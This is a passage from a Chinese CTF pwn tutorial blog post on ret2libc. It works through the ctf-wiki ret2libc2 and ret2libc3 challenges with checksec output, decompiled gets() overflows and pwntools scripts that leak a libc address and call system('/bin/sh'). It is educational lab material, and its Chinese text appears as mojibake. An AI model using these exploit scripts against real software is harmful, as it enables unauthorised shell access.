</span></span><span class=line><span class=cl>    Debuginfo:  Yes</span></span></code></pre></td></tr></table></div></div><p>é™æ€åˆ†æï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-15-1><a class=lnlinks href=#hl-15-1> 1</a>
</span><span class=lnt id=hl-15-2><a class=lnlinks href=#hl-15-2> 2</a>
</span><span class=lnt id=hl-15-3><a class=lnlinks href=#hl-15-3> 3</a>
</span><span class=lnt id=hl-15-4><a class=lnlinks href=#hl-15-4> 4</a>
</span><span class=lnt id=hl-15-5><a class=lnlinks href=#hl-15-5> 5</a>
</span><span class=lnt id=hl-15-6><a class=lnlinks href=#hl-15-6> 6</a>
</span><span class=lnt id=hl-15-7><a class=lnlinks href=#hl-15-7> 7</a>
</span><span class=lnt id=hl-15-8><a class=lnlinks href=#hl-15-8> 8</a>
</span><span class=lnt id=hl-15-9><a class=lnlinks href=#hl-15-9> 9</a>
</span><span class=lnt id=hl-15-10><a class=lnlinks href=#hl-15-10>10</a>
</span><span class=lnt id=hl-15-11><a class=lnlinks href=#hl-15-11>11</a>
</span><span class=lnt id=hl-15-12><a class=lnlinks href=#hl-15-12>12</a>
</span><span class=lnt id=hl-15-13><a class=lnlinks href=#hl-15-13>13</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__cdecl</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>envp</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>s</span><span class=p>[</span><span class=mi>100</span><span class=p>];</span> <span class=c1>// [esp+1Ch] [ebp-64h] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=nf>setvbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>setvbuf</span><span class=p>(</span><span class=n>_bss_start</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Something surprise here, but I don&#39;t think it will work.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;What do you think ?&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>gets</span><span class=p>(</span><span class=n>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>plt</span><span class=p>:</span><span class=mi>08048490</span> <span class=n>_system</span>         <span class=n>proc</span> <span class=n>near</span>               <span class=p>;</span> <span class=n>CODE</span> <span class=nl>XREF</span><span class=p>:</span> <span class=n>secure</span><span class=o>+</span><span class=mi>44</span><span class=err>â†“</span><span class=n>p</span></span></span></code></pre></td></tr></table></div></div><p>æ²¡æœ‰ <code>/bin/sh</code> å­—ç¬¦ä¸²æˆ‘ä»¬å°±è‡ªå·±ä¼ å…¥</p><p>payload.py:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-16-1><a class=lnlinks href=#hl-16-1> 1</a>
</span><span class=lnt id=hl-16-2><a class=lnlinks href=#hl-16-2> 2</a>
</span><span class=lnt id=hl-16-3><a class=lnlinks href=#hl-16-3> 3</a>
</span><span class=lnt id=hl-16-4><a class=lnlinks href=#hl-16-4> 4</a>
</span><span class=lnt id=hl-16-5><a class=lnlinks href=#hl-16-5> 5</a>
</span><span class=lnt id=hl-16-6><a class=lnlinks href=#hl-16-6> 6</a>
</span><span class=lnt id=hl-16-7><a class=lnlinks href=#hl-16-7> 7</a>
</span><span class=lnt id=hl-16-8><a class=lnlinks href=#hl-16-8> 8</a>
</span><span class=lnt id=hl-16-9><a class=lnlinks href=#hl-16-9> 9</a>
</span><span class=lnt id=hl-16-10><a class=lnlinks href=#hl-16-10>10</a>
</span><span class=lnt id=hl-16-11><a class=lnlinks href=#hl-16-11>11</a>
</span><span class=lnt id=hl-16-12><a class=lnlinks href=#hl-16-12>12</a>
</span><span class=lnt id=hl-16-13><a class=lnlinks href=#hl-16-13>13</a>
</span><span class=lnt id=hl-16-14><a class=lnlinks href=#hl-16-14>14</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>##!/usr/bin/env python</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sh</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./ret2libc2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>gets_plt</span> <span class=o>=</span> <span class=mh>0x08048460</span>
</span></span><span class=line><span class=cl><span class=n>system_plt</span> <span class=o>=</span> <span class=mh>0x08048490</span>
</span></span><span class=line><span class=cl><span class=n>pop_ebx</span> <span class=o>=</span> <span class=mh>0x0804843d</span>
</span></span><span class=line><span class=cl><span class=n>buf2</span> <span class=o>=</span> <span class=mh>0x804a080</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mi>112</span><span class=p>,</span> <span class=n>gets_plt</span><span class=p>,</span> <span class=n>pop_ebx</span><span class=p>,</span> <span class=n>buf2</span><span class=p>,</span> <span class=n>system_plt</span><span class=p>,</span> <span class=mh>0xdeadbeef</span><span class=p>,</span> <span class=n>buf2</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;/bin/sh&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span></span></span></code></pre></td></tr></table></div></div><p><code>pop_ebx</code> æ˜¯ä¸ºäº†å°† buf2 å¼¹å‡ºå»ï¼Œ ä½¿å¾— PC æŒ‡å‘ <code>sysem_plt</code></p><h3 id=ret2libc3>ret2libc3
<a class=header-anchor href=#ret2libc3></a></h3><p><a href=https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/stackoverflow/ret2libc/ret2libc3 title=ret2libc3 rel="noopener external nofollow noreferrer" target=_blank class=exturl>ret2libc3
<i class="fa fa-external-link-alt"></i></a></p><p>å®‰å…¨æ£€æŸ¥</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-17-1><a class=lnlinks href=#hl-17-1>1</a>
</span><span class=lnt id=hl-17-2><a class=lnlinks href=#hl-17-2>2</a>
</span><span class=lnt id=hl-17-3><a class=lnlinks href=#hl-17-3>3</a>
</span><span class=lnt id=hl-17-4><a class=lnlinks href=#hl-17-4>4</a>
</span><span class=lnt id=hl-17-5><a class=lnlinks href=#hl-17-5>5</a>
</span><span class=lnt id=hl-17-6><a class=lnlinks href=#hl-17-6>6</a>
</span><span class=lnt id=hl-17-7><a class=lnlinks href=#hl-17-7>7</a>
</span><span class=lnt id=hl-17-8><a class=lnlinks href=#hl-17-8>8</a>
</span><span class=lnt id=hl-17-9><a class=lnlinks href=#hl-17-9>9</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ pwn checksec ./ret2libc3             <span class=o>(</span>.venv<span class=o>)</span> master âœ± â—¼
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> <span class=s1>&#39;/home/lhon901/Pwn/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2libc/ret2libc3/ret2libc3&#39;</span>
</span></span><span class=line><span class=cl>    Arch:       i386-32-little
</span></span><span class=line><span class=cl>    RELRO:      Partial RELRO
</span></span><span class=line><span class=cl>    Stack:      No canary found
</span></span><span class=line><span class=cl>    NX:         NX enabled
</span></span><span class=line><span class=cl>    PIE:        No PIE <span class=o>(</span>0x8048000<span class=o>)</span>
</span></span><span class=line><span class=cl>    Stripped:   No
</span></span><span class=line><span class=cl>    Debuginfo:  Yes</span></span></code></pre></td></tr></table></div></div><p>é™æ€åˆ†æï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-18-1><a class=lnlinks href=#hl-18-1> 1</a>
</span><span class=lnt id=hl-18-2><a class=lnlinks href=#hl-18-2> 2</a>
</span><span class=lnt id=hl-18-3><a class=lnlinks href=#hl-18-3> 3</a>
</span><span class=lnt id=hl-18-4><a class=lnlinks href=#hl-18-4> 4</a>
</span><span class=lnt id=hl-18-5><a class=lnlinks href=#hl-18-5> 5</a>
</span><span class=lnt id=hl-18-6><a class=lnlinks href=#hl-18-6> 6</a>
</span><span class=lnt id=hl-18-7><a class=lnlinks href=#hl-18-7> 7</a>
</span><span class=lnt id=hl-18-8><a class=lnlinks href=#hl-18-8> 8</a>
</span><span class=lnt id=hl-18-9><a class=lnlinks href=#hl-18-9> 9</a>
</span><span class=lnt id=hl-18-10><a class=lnlinks href=#hl-18-10>10</a>
</span><span class=lnt id=hl-18-11><a class=lnlinks href=#hl-18-11>11</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__cdecl</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>envp</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>s</span><span class=p>[</span><span class=mi>100</span><span class=p>];</span> <span class=c1>// [esp+1Ch] [ebp-64h] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=nf>setvbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>setvbuf</span><span class=p>(</span><span class=n>stdin</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;No surprise anymore, system disappeard QQ.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Can you find it !?&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>gets</span><span class=p>(</span><span class=n>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></td></tr></table></div></div><p>æ—  <code>system</code> å‡½æ•°å’Œ <code>/bin/sh</code> å­—ç¬¦ä¸²</p><div class=post-alert-note><div class=post-alert-title><i class="fa-solid fa-bell"></i>
<span>é»˜è®¤æƒ…å†µä¸‹æ ˆå’Œåº“æ–‡ä»¶å†…å­˜åŒºåŸŸä¼šè¢«éšæœºåŒ–</span></div><div class=post-alert-content></div></div><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>puts</code> å‡½æ•°è¾“å‡º <code>puts</code> å‡½æ•°çš„ got åœ°å€ï¼Œç¨‹åºçš„ä½ä¸‰ä½æ˜¯ä¸å˜çš„ï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®æ­¤è®¡ç®—å‡ºå…¶ä»–å‡½æ•°çš„å®é™…åœ°å€</p><p>å¯ä»¥é€šè¿‡
<a href=https://libc.rip/ title=libc-database rel="noopener external nofollow noreferrer" target=_blank class=exturl>libc-database
<i class="fa fa-external-link-alt"></i>
</a>æŸ¥è¯¢</p><p>ä¹Ÿå¯ä»¥é€šè¿‡
<a href=https://github.com/rycbar77/LibcSearcher title=LibcSearcher rel="noopener external nofollow noreferrer" target=_blank class=exturl>LibcSearcher
<i class="fa fa-external-link-alt"></i>
</a>è¿™ä¸ªåº“å¿«é€ŸæŸ¥è¯¢</p><p>payload.py:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-19-1><a class=lnlinks href=#hl-19-1> 1</a>
</span><span class=lnt id=hl-19-2><a class=lnlinks href=#hl-19-2> 2</a>
</span><span class=lnt id=hl-19-3><a class=lnlinks href=#hl-19-3> 3</a>
</span><span class=lnt id=hl-19-4><a class=lnlinks href=#hl-19-4> 4</a>
</span><span class=lnt id=hl-19-5><a class=lnlinks href=#hl-19-5> 5</a>
</span><span class=lnt id=hl-19-6><a class=lnlinks href=#hl-19-6> 6</a>
</span><span class=lnt id=hl-19-7><a class=lnlinks href=#hl-19-7> 7</a>
</span><span class=lnt id=hl-19-8><a class=lnlinks href=#hl-19-8> 8</a>
</span><span class=lnt id=hl-19-9><a class=lnlinks href=#hl-19-9> 9</a>
</span><span class=lnt id=hl-19-10><a class=lnlinks href=#hl-19-10>10</a>
</span><span class=lnt id=hl-19-11><a class=lnlinks href=#hl-19-11>11</a>
</span><span class=lnt id=hl-19-12><a class=lnlinks href=#hl-19-12>12</a>
</span><span class=lnt id=hl-19-13><a class=lnlinks href=#hl-19-13>13</a>
</span><span class=lnt id=hl-19-14><a class=lnlinks href=#hl-19-14>14</a>
</span><span class=lnt id=hl-19-15><a class=lnlinks href=#hl-19-15>15</a>
</span><span class=lnt id=hl-19-16><a class=lnlinks href=#hl-19-16>16</a>
</span><span class=lnt id=hl-19-17><a class=lnlinks href=#hl-19-17>17</a>
</span><span class=lnt id=hl-19-18><a class=lnlinks href=#hl-19-18>18</a>
</span><span class=lnt id=hl-19-19><a class=lnlinks href=#hl-19-19>19</a>
</span><span class=lnt id=hl-19-20><a class=lnlinks href=#hl-19-20>20</a>
</span><span class=lnt id=hl-19-21><a class=lnlinks href=#hl-19-21>21</a>
</span><span class=lnt id=hl-19-22><a class=lnlinks href=#hl-19-22>22</a>
</span><span class=lnt id=hl-19-23><a class=lnlinks href=#hl-19-23>23</a>
</span><span class=lnt id=hl-19-24><a class=lnlinks href=#hl-19-24>24</a>
</span><span class=lnt id=hl-19-25><a class=lnlinks href=#hl-19-25>25</a>
</span><span class=lnt id=hl-19-26><a class=lnlinks href=#hl-19-26>26</a>
</span><span class=lnt id=hl-19-27><a class=lnlinks href=#hl-19-27>27</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>LibcSearcher</span> <span class=kn>import</span> <span class=n>LibcSearcher</span>
</span></span><span class=line><span class=cl><span class=n>sh</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./ret2libc3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ret2libc3</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./ret2libc3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>puts_plt</span> <span class=o>=</span> <span class=n>ret2libc3</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>libc_start_main_got</span> <span class=o>=</span> <span class=n>ret2libc3</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;__libc_start_main&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>main</span> <span class=o>=</span> <span class=n>ret2libc3</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;main&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;leak libc_start_main_got addr and return to main again&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>([</span><span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mi>112</span><span class=p>,</span> <span class=n>puts_plt</span><span class=p>,</span> <span class=n>main</span><span class=p>,</span> <span class=n>libc_start_main_got</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Can you find it !?&#39;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;get the related addr&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc_start_main_addr</span> <span class=o>=</span> <span class=n>u32</span><span class=p>(</span><span class=n>sh</span><span class=o>.</span><span class=n>recv</span><span class=p>()[</span><span class=mi>0</span><span class=p>:</span><span class=mi>4</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>LibcSearcher</span><span class=p>(</span><span class=s1>&#39;__libc_start_main&#39;</span><span class=p>,</span> <span class=n>libc_start_main_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libcbase</span> <span class=o>=</span> <span class=n>libc_start_main_addr</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>dump</span><span class=p>(</span><span class=s1>&#39;__libc_start_main&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>system_addr</span> <span class=o>=</span> <span class=n>libcbase</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>dump</span><span class=p>(</span><span class=s1>&#39;system&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>binsh_addr</span> <span class=o>=</span> <span class=n>libcbase</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>dump</span><span class=p>(</span><span class=s1>&#39;str_bin_sh&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;get shell&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>([</span><span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mi>104</span><span class=p>,</span> <span class=n>system_addr</span><span class=p>,</span> <span class=mh>0xdeadbeef</span><span class=p>,</span> <span class=n>binsh_addr</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span></span></span></code></pre></td></tr></table></div></div></div><footer class=post-footer><div class=post-tags><a href=/tags/ctf/>Ctf
</a><a href=/tags/pwn/>Pwn</a></div><div class=post-share-tools><div class=post-share-loading><i class="fa-solid fa-ellipsis fa-spin"></i></div><div class="a2a_kit a2a_kit_size_32 a2a_default_style"><a class=a2a_dd href=https://www.addtoany.com/share></a><a class=a2a_button_wechat></a><a class=a2a_button_qzone></a><a class=a2a_button_sina_weibo></a><a class=a2a_button_douban></a><a class=a2a_button_facebook></a><a class=a2a_button_x></a><a class=a2a_button_email></a><a class=a2a_button_printfriendly></a></div></div><hr><div class=reward-container><div><i class="fa-solid fa-mug-hot"></i>è¯·æˆ‘å–æ¯å’–å•¡å§ ãƒ¾(^â–½^*)))</div><button>
èµèµ</button><div class=post-reward><div class=post-reward-item><img src=/imgs/img-lazy-loading.gif data-src=/imgs/ali-pay.jpg alt="lhon901 - æ”¯ä»˜å®">
<span>æ”¯ä»˜å®</span></div><div class=post-reward-item><img src=/imgs/img-lazy-loading.gif data-src=/imgs/wechat-pay.jpg alt="lhon901 - å¾®ä¿¡">
<span>å¾®ä¿¡</span></div></div></div><div class=post-copyright><img src=/imgs/cc/cc.svg class=cc-icon width=75 height=75 align=right alt=å…±äº«çŸ¥è¯† title=å…±äº«çŸ¥è¯†><ul><li class=post-copyright-title><strong>æ–‡ç« æ ‡é¢˜ï¼š</strong>
ä»é›¶å¼€å§‹çš„ Pwn ä¹‹æ—… - Ret2libc</li><li class=post-copyright-author><strong>æœ¬æ–‡ä½œè€…ï¼š </strong>lhon901</li><li class=post-copyright-link><strong>æœ¬æ–‡é“¾æ¥ï¼š</strong>
<a id=post-cr-link href=/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2libc/ title="ä»é›¶å¼€å§‹çš„ Pwn ä¹‹æ—… - Ret2libc">/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2libc/</a></li><li class=post-copyright-license><strong>ç‰ˆæƒå£°æ˜ï¼š </strong>æœ¬ä½œå“é‡‡ç”¨ <i class="fab fa-fw fa-creative-commons"></i><a target=_blank href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans>BY-NC-SA</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼</li><li><div class=license-icons><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans target=_blank><img src=/imgs/cc/big/by_nc_sa.svg alt=BY-NC-SA title=BY-NC-SA>
</a><a href=https://notbyai.fyi target=_blank><img src=/imgs/notbyai/zh-hans/.svg title="Not By AI"></a></div></li></ul></div><div class=followme><span>æ¬¢è¿å…³æ³¨æˆ‘çš„å…¶å®ƒå‘å¸ƒæ¸ é“</span><div class=social-list><div class=social-item><a target=_blank class=social-link href=/images/wechat_channel.jpg><span class=icon><i class="fab fa-weixin"></i>
</span><span class=label>WeChat</span></a></div><div class=social-item><a target=_blank class=social-link href=/atom.xml><span class=icon><i class="fa fa-rss"></i>
</span><span class=label>RSS</span></a></div></div></div><div class=post-nav><div class="post-nav-next post-nav-item"><a href=/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---cancary/ rel=next title="ä»é›¶å¼€å§‹çš„ Pwn ä¹‹æ—… - Cancary"><i class="fa fa-chevron-left"></i> ä»é›¶å¼€å§‹çš„ Pwn ä¹‹æ—… - Cancary</a></div><div class="post-nav-prev post-nav-item"><a href=/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2syscall/ rel=prev title="ä»é›¶å¼€å§‹çš„ Pwn ä¹‹æ—… - Ret2syscall">ä»é›¶å¼€å§‹çš„ Pwn ä¹‹æ—… - Ret2syscall
<i class="fa fa-chevron-right"></i></a></div></div></footer></article></div></div></main><footer class=footer><div class=footer-inner><div id=i18n-translate class=i18n-translate><i class="fa fa-language"></i><div id=lang-select class=lang-select><div id=lang-selected class=selected-option><span class="flag-icon flag-icon-zh-cn"></span>
<span class=selected-language>ç®€ä½“ä¸­æ–‡</span>
<i class="fa fa-chevron-down"></i></div><div id=lang-options class=lang-options><div class=lang-option lang-code=zh-cn lang-name=ç®€ä½“ä¸­æ–‡ lang-url=/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2libc/><span class="flag-icon flag-icon-zh-cn"></span>
<span class=lang-name>ç®€ä½“ä¸­æ–‡</span></div></div></div></div><div class=copyright>&copy;
<span itemprop=copyrightYear>2025
</span><span class=with-love><i class="fa fa-heart"></i>
</span><span class=author itemprop=copyrightHolder>Â© 2024 lhon901. All rights reserved.</span></div><div class=powered-by>ç”± <a href=https://gohugo.io title=0.146.0 target=_blank>Hugo</a> & <a href=https://github.com/hugo-next/hugo-theme-next title=4.8.3 target=_blank>Hugo NexT.Gemini</a> å¼ºåŠ›é©±åŠ¨</div></div></footer><script class=next-config data-name=page type=application/json>{"clipboard":{"js":{"alias":"clipboard","file":"dist/clipboard.min.js","name":"clipboard.js","version":"2.0.11"}},"comments":false,"expired":false,"isHome":false,"isPage":true,"path":"%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2libc","permalink":"/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2libc/","title":"ä»é›¶å¼€å§‹çš„ Pwn ä¹‹æ—… - Ret2libc","toc":true,"waline":{"commentcnt":{"alias":"@waline/client","alias_name":"waline","file":"dist/comment.js","name":"comment","version":"2.15.8"}}}</script><script type=text/javascript src=/js/3rd/animejs/3.2.2/anime.min.js crossorigin=anonymous defer></script><script type=text/javascript src=/js/3rd/viewerjs/1.11.6/viewer.min.js crossorigin=anonymous defer></script><script class=next-config data-name=main type=application/json>{"bookmark":{"color":"#222","enable":true,"save":"manual"},"copybtn":true,"darkmode":false,"giscus":{"cfg":{"category":"Comments","categoryid":null,"emit":false,"inputposition":"top","mapping":"title","reactions":false,"repo":"username/repo-name","repoid":null,"theme":"preferred_color_scheme"},"js":"https://giscus.app/client.js"},"hostname":"/","i18n":{"ds_day":" å¤©å‰","ds_days":" å¤© ","ds_hour":" å°æ—¶å‰","ds_hours":" å°æ—¶ ","ds_just":"åˆšåˆš","ds_min":" åˆ†é’Ÿå‰","ds_mins":" åˆ†é’Ÿ","ds_month":" ä¸ªæœˆå‰","ds_years":" å¹´ ","empty":"æ²¡æœ‰æ‰¾åˆ°ä»»ä½•æœç´¢ç»“æœï¼š${query}","hits":"æ‰¾åˆ° ${hits} ä¸ªæœç´¢ç»“æœ","hits_time":"æ‰¾åˆ° ${hits} ä¸ªæœç´¢ç»“æœï¼ˆç”¨æ—¶ ${time} æ¯«ç§’ï¼‰","placeholder":"æœç´¢..."},"isMultiLang":true,"lang":"zh-CN","lazyload":false,"localSearch":{"enable":true,"limit":1e3,"path":"/searchindexes.xml","preload":false,"topnperarticle":-1,"trigger":"auto","unescape":false},"motion":{"async":true,"enable":true,"transition":{"collheader":"slideInRight","postblock":"fadeIn","postbody":"fadeInDown","postheader":"fadeInDown","sidebar":"fadeInUp"}},"postmeta":{"comments":{"enable":true,"plugin":"waline"},"views":{"enable":true,"plugin":"busuanzi"}},"root":"/","scheme":"Gemini","share":{"addtoany":{"js":"https://static.addtoany.com/menu/page.js","locale":"zh-CN","num":8},"enable":true},"sidebar":{"display":"post","offset":12,"padding":18,"position":"left","width":256},"vendor":{"plugins":"local","router":{"name":"local","type":"modern","url":"/js/3rd"}},"version":"4.8.3","waline":{"cfg":{"emoji":false,"imguploader":false,"placeholder":"è¯·æ–‡æ˜å‘è¨€å“Ÿ ãƒ¾(â‰§â–½â‰¦*)o","reaction":true,"reactiontext":["ç‚¹èµ","è¸©ä¸€ä¸‹","å¾—æ„","ä¸å±‘","å°´å°¬","ç¡è§‰"],"reactiontitle":"ä½ è®¤ä¸ºè¿™ç¯‡æ–‡ç« æ€ä¹ˆæ ·ï¼Ÿ","requiredmeta":["nick","mail"],"serverurl":null,"sofa":"å¿«æ¥å‘è¡¨ä½ çš„æ„è§å§ (â‰§âˆ€â‰¦)ã‚","wordlimit":200},"css":{"alias":"@waline/client","file":"dist/waline.css","name":"waline","version":"2.15.8"},"js":{"alias":"@waline/client","file":"dist/waline.js","name":"waline","version":"2.15.8"}}}</script><script type=text/javascript src="/js/main.min.js?=1752244419" defer></script><script type=text/javascript src="/js/clipboard.min.js?=1752244419" defer></script></body></html>